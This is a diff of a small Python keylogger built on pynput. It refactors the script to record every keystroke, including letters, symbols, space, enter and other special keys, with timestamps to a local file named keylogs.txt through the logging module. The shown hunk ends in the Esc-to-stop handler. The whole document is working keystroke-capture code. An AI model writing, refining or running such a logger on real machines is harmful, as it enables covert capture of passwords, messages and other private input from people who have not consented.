@@ -1,29 +1,18 @@
-import pynput
+import logging
 from pynput import keyboard
+
+logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
     try:
-        with open("keylogs.txt", "a") as f:
-            if key.char.isalnum():
-                f.write(key.char)
-                print(f"Logged: {key.char}")
-            elif key.char in ['.', ',', '!', '?', ';', ':', '-', '_', '=', '+', '[', ']', '{', '}', '\\', '|', '/', '`', '~', '@', '#', '$', '%', '^', '&', '*', '(', ')']:
-                f.write(key.char)
-                print(f"Logged: {key.char}")
+        logging.info(f'Alphanumeric key pressed: {key.char}')
     except AttributeError:
-        with open("keylogs.txt", "a") as f:
-            if key == keyboard.Key.space:
-                f.write(' ')
-                print("Logged: [SPACE]")
-            elif key == keyboard.Key.enter:
-                f.write('\n')
-                print("Logged: [ENTER]")
-            elif key == keyboard.Key.tab:
-                f.write('\t')
-                print("Logged: [TAB]")
-            else:
-                f.write(f"[{key.name.upper()}]")
-                print(f"Logged: [{key.name.upper()}]")
+        if key == keyboard.Key.space:
+            logging.info('Space key pressed')
+        elif key == keyboard.Key.enter:
+            logging.info('Enter key pressed')
+        else:
+            logging.info(f'Special key pressed: {key.name}')
 
 def on_release(key):
     if key == keyboard.Key.esc:
